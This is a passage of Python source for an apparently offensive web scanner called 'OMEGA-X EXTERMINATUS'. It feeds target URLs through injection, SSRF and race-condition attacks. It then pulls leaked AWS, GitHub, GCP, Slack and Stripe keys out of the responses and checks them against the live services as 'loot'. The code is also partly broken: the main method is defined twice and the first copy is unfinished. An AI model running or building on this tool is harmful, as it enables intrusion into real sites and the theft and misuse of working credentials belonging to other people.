                results.extend(run_advanced(OmniValidator.validate_injection_pro, base_url, param, name="Injection"))
                results.extend(run_advanced(OmniValidator.validate_ssrf_and_redirect, base_url, param, name="SSRF"))
                results.extend(run_advanced(OmniValidator.validate_race_condition_aggressive, base_url, param, name="Race"))

            # --- [ESTÁGIO 5: VALIDAÇÃO ATIVA DE LOOT (THE EXTERMINATOR)] ---
            validated_loot = []
            for r in results:
                # 1. Filtro de falsos positivos por tamanho
                if "size" in r and r['size'] < 180 and r.get('severity') != "CRITICAL": 
                    continue
                
                msg = str(r.get('msg', ''))
                details = str(r.get('details', ''))
                full_content = f"{msg} {details}"

                # 2. MOTOR UNIVERSAL (GCP, SLACK, STRIPE, AZURE, HEROKU)
                active_leak = KeyExterminator.auto_verify_all(full_content)
                
                if active_leak:
                    r['msg'] = f"☢️ [VALIDADO: {active_leak['service']}] {active_leak['info']}"
                    r['severity'], r['cvss'] = "CRITICAL", 10.0
                
                # 3. TRATAMENTO ESPECIAL: AWS (Requer par Key + Secret)
                elif "AKIA" in full_content:
                    keys = re.findall(r'AKIA[0-9A-Z]{16}', full_content)
                    secrets = re.findall(r'[a-zA-Z0-9/+=]{40}', full_content)
                    if keys and secrets:
                        status = KeyExterminator.verify_aws(keys[0], secrets[0])
                        if status:
                            r['msg'] = f"☢️ [AWS ATIVA] {status}"
                            r['severity'], r['cvss'] = "CRITICAL", 10.0

                # 4. TRATAMENTO ESPECIAL: GITHUB (Se não estiver no auto_verify_all ainda)
                elif "ghp_" in full_content:
                    tokens = re.findall(r'ghp_[a-zA-Z0-9]{36}', full_content)
                    if tokens:
                        status = KeyExterminator.verify_github(tokens[0])
                        if status:
                            r['msg'] = f"🔥 [GITHUB VALIDADO] {status}"
                            r['severity'], r['cvss'] = "CRITICAL", 9.5

                validated_loot.append(r)

            # --- [PERSISTÊNCIA E LOGGING PROFISSIONAL] ---
            if validated_loot:
                report_path = os.path.join(REPORTS_DIR, f"{domain.replace('.', '_')}_{fid}.json")
                with open(report_path, "w") as f:
                    json.dump({"target": url, "findings": validated_loot, "ts": str(datetime.datetime.now())}, f, indent=4)

                with AuditorCore.lock:
                    AuditorCore.found_count += len(validated_loot)
                    for r in validated_loot:
                        color = "\033[1;91m" if r.get('cvss', 0) >= 9.0 else "\033[1;93m"
                        print(f"{color}[☢️ {r['severity']}] ID: {fid} | {r['msg']} | {domain}\033[0m")
            else:
                with AuditorCore.lock:
                    print(f"\033[1;36m[*] CLEAN: {domain} (Fid: {fid})\033[0m")

            return {"id": fid, "url": url, "vulnerabilities": validated_loot}

        except Exception as e:
            return None

    @staticmethod
    def main(file_path):
        # 1. Configurações de Inicialização
        AuditorCore.start_time = time.time()
        AuditorCore.found_count = 0
        AuditorCore.done_tasks = 0
        WIDTH = 82
        bar_border = "=" * WIDTH

        # 2. Cabeçalho Fixo Vermelho
        print(f"\n\033[1;31m{bar_border}")
        print(f"{'♦ BOOT SEQUENCE INITIATED | MODO DE COMBATE ATIVO ♦'.center(WIDTH)}")
        print(f"{bar_border}\033[0m")

        # 3. ESPAÇAMENTO MÍNIMO (Elimina a linha branca selecionada)
        print("\n")          # Vácuo mínimo para o painel flutuar
        print("- ")          # Traço de ancoragem logo abaixo

        # SALVA A POSIÇÃO DO TRAÇO
        sys.stdout.write("\033[s")
        sys.stdout.flush()

    @staticmethod
    def main(file_path):
        # 1. Configurações de Inicialização
        AuditorCore.start_time = time.time()
        AuditorCore.found_count = 0
        AuditorCore.done_tasks = 0
        WIDTH = 85
        bar_border = "=" * WIDTH

        # 2. Cabeçalho Fixo Vermelho (Banner de Combate)
        print(f"\n\033[1;31m{bar_border}")
        print(f"{'♦ BOOT SEQUENCE INITIATED | MODO DE COMBATE ATIVO ♦'.center(WIDTH)}")
        print(f"{bar_border}\033[0m")

        # 3. Criar o espaço para a barra e SALVAR a âncora
        print("\n\n") 
        sys.stdout.write("\033[s") # Salva a posição aqui (âncora)
        sys.stdout.flush()

        def update_ui_panel(current, total, phase_text=None):
            if total <= 0: total = 1
            with AuditorCore.lock:
                pct = (current / total * 100)
                elapsed = time.time() - AuditorCore.start_time
                speed = current / elapsed if elapsed > 0 else 0

                # Barra Visual
                bar_width = 40
                filled = int(bar_width * current // total)
                bar_chars = '█' * filled + '░' * (bar_width - filled)
                bar_line = f"[{bar_chars}] {pct:.2f}%"

                # Métricas
                remaining = total - current
                eta_str = time.strftime("%H:%M:%S", time.gmtime(remaining / speed)) if speed > 0 else "--:--:--"
                status_line = (f"[{AuditorCore.current_subphase}] {current}/{total} | "
                               f"VULNS: {AuditorCore.found_count} | Speed: {speed:.2f} t/s | ETA: {eta_str}")

                # Lógica ANSI para colar no banner e evitar espaço branco
                sys.stdout.write("\033[u")      # Volta ao traço salvo
                sys.stdout.write("\033[2A")     # Sobe 2 linhas para encostar no vermelho

                # Linha 1: Barra Amarela
                sys.stdout.write("\r\033[K")
                sys.stdout.write(f"\033[1;33m{bar_line.center(WIDTH)}\033[0m\n")

                # Linha 2: Métricas Amarelas
                sys.stdout.write("\r\033[K")
                sys.stdout.write(f"\033[1;33m{status_line.center(WIDTH)}\033[0m")

                sys.stdout.write("\033[u")      # Pousa o cursor para os logs não cobrirem a barra
                sys.stdout.flush()

        # === LÓGICA DE CARREGAMENTO ===
        all_tasks = []
        AuditorCore.current_subphase = "CARREGANDO"

        try:
            with open(file_path, 'r', encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f.readlines() if l.strip()]
                total_f = len(lines)

                cid, cblock = None, []
                for idx, line in enumerate(lines, 1):
                    if idx % 100 == 0: update_ui_panel(idx, total_f)

                    if "[ID]" in line or "[FIND ID]" in line:
                        if cid: all_tasks.append((cid, cblock))
                        cid = line.split("]")[1].strip() if "]" in line else f"ID_{idx}"
                        cblock = [line]
                        # Log discreto para não soterrar a barra
                        sys.stdout.write(f"[*] Processando metadados: {cid[:25]}...\n")
                    else:
                        if not cid: cid = f"ID_{idx}"
                        cblock.append(line)

                if cid and cblock: all_tasks.append((cid, cblock))
        except Exception as e:
            print(f"\n\033[1;31m[!] Erro crítico: {e}\033[0m")
            return

        AuditorCore.total_tasks = len(all_tasks)
        AuditorCore.start_time = time.time() 
        AuditorCore.current_subphase = "SCANNING"

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(AuditorCore.process_task, t[0], t[1], update_ui_panel): t[0] for t in all_tasks}
            for fut in as_completed(futures):
                with AuditorCore.lock:
                    AuditorCore.done_tasks += 1
                update_ui_panel(AuditorCore.done_tasks, AuditorCore.total_tasks)

        print(f"\n\033[1;32m{bar_border}")
        print(f"{('OPERAÇÃO FINALIZADA | TOTAL VULNS: ' + str(AuditorCore.found_count)).center(WIDTH)}")
        print(f"{bar_border}\033[0m\n")

if __name__ == "__main__":
    try:
        sync_wordlists_omega()

        WIDTH = 85
        init_border = "=" * WIDTH
        
        if len(sys.argv) > 1:
            target_file = sys.argv[1]
        else:
            print(f"\n\033[1;34m{init_border}")
            print(f"{'♦ INSANE OMEGA-X EXTERMINATUS v3.1 ♦'.center(WIDTH)}")
            print(f"{init_border}\033[0m")
            target_file = input("\033[1;36m[?] Digite o nome do arquivo alvo (.txt): \033[0m").strip()

        if target_file and os.path.exists(target_file):
            if os.path.getsize(target_file) > 0:
                print(f"\033[1;32m[+] Alvo carregado: {target_file}")
                print(f"[+] OMEGA-X ATIVADO! Iniciando Auditoria...\033[0m")
                
                # Executa o main que acabamos de corrigir
                AuditorCore.main(target_file) 
            else:
                print(f"\n\033[1;31m[x] ERRO: O arquivo está vazio!\033[0m")
        else:
            print(f"\n\033[1;31m[x] ERRO: Arquivo não encontrado.\033[0m")

    except KeyboardInterrupt:
        print(f"\n\033[1;31m[!] OPERAÇÃO ABORTADA.\033[0m")
        sys.exit(0)
